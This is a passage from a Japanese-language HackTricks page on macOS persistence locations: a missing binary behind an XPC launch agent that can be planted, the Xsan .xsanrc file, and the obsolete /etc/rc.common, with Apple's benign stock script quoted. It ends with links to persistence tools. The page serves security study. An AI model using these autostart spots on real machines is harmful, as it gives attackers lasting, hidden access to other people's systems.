どうやら`plist`（`/System/Library/LaunchAgents/com.apple.amstoold.plist`）はこのバイナリを使用して XPC service を公開していました... 問題はそのバイナリが存在しなかったため、そこに何かを配置すると XPC service が呼ばれたときにあなたのバイナリが呼び出される、ということです。

私の macOS ではもうこれを見つけられません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### 場所

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root 権限が必要
- **トリガー**: サービスが実行されたとき（まれ）

#### 説明 & exploit

このスクリプトを実行することはあまり一般的ではなく、私の macOS でも見つけられなかったので、詳細は writeup を参照してください。

### ~~/etc/rc.common~~

> [!CAUTION] > **これは現代の MacOS バージョンでは動作しません**

ここに**起動時に実行されるコマンド**を置くことも可能です。通常の rc.common スクリプトの例:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 永続化の手法とツール

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## 参考資料

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
